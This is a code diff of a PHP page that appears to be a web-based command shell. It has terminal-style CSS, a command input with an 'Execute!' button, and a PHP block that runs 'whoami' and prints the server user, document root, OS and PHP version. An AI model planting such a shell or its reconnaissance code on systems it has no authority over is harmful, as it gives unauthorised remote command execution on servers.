@@ -16,38 +16,62 @@
 
 body{background-color: black; }
 .output{
- border: 0;
- color: white;
-   background-color: black;
- width: 100%;
- height: 90%;
- padding:0px;
- margin:0px;
+  border: 0;
+  color: white;
+  background-color: black;
+  font-family:"Courier New",monospace;
+  font-size:12px;
+  width: 100%;
+  height: 90%;
+  padding:0px;
+  margin:0px;
 }
 .input{
- color: white;
+  border:0;
+  border-bottom:2px inset white;
+  border-top:2px inset white;
+  color: white;
   background-color: black;
- width: 100%;
- height: 5%;
- padding:0px;
- margin:0px;
+  font-family:"Courier New",monospace;
+  font-size:12px;
+  width: 90%;
+  height: 4%;
+  padding:0px;
+  margin:0px;
 }
 .info{
   border: 0;
   color:white;
   background-color: black;
+  font-family:"Courier New",monospace;
+  font-size:12px;
   width: 100%;
-  height: 5%;
- padding:0px;
- margin:0px;
+  height: 3%;
+  padding:0px;
+  margin:0px;
+  vertical-align:bottom;
 }
 .form1{
   padding:0px;
- margin:0px;
+  margin:0px;
+  border:0px;
+}
+.button{
+  padding:0px;
+  margin:0px;
+  border:1px outset white;
+  color:white;
+  background-color: black;
+  font-family:"Courier New",monospace;
+  font-size:12px;
+  text-align: center;
+  height: 4%;
+  min-width:10%;
+  float:right;
 }
 html,body{
- padding:0px;
- margin:0px;
+  padding:0px;
+  margin:0px;
 }
 p{ color:white; }
 </style>
@@ -179,16 +203,17 @@ function useHttpResponse() {
 
 </textarea>
 <textarea name="input" class="input"></textarea>
-</form>
+<button name="submit_button" class="button" type="button" readonly=true onclick="updateData(document.form1.input.value); document.form1.input.value=''">Execute!</button>
 <textarea name="info" class="info" readonly=true>
 <? 
-exec("whoami",$who); exec("pwd",$pwd);
-echo "user: $who[0]\tlocation: $pwd[0]";
+exec("whoami",$who);
+$pwd=$_SERVER["DOCUMENT_ROOT"];
+$sys=PHP_OS . ", " .$_SERVER['SERVER_SOFTWARE']. ", " . phpversion();
+echo "user: $who[0]\tlocation: $pwd\tsystem: $sys"; 
 ?>
 </textarea>
-<script>
-document.form1.output.value="";
-</script>
+</form>
+<script>document.form1.output.value="";</script>
 </body>
 </html>
 <?
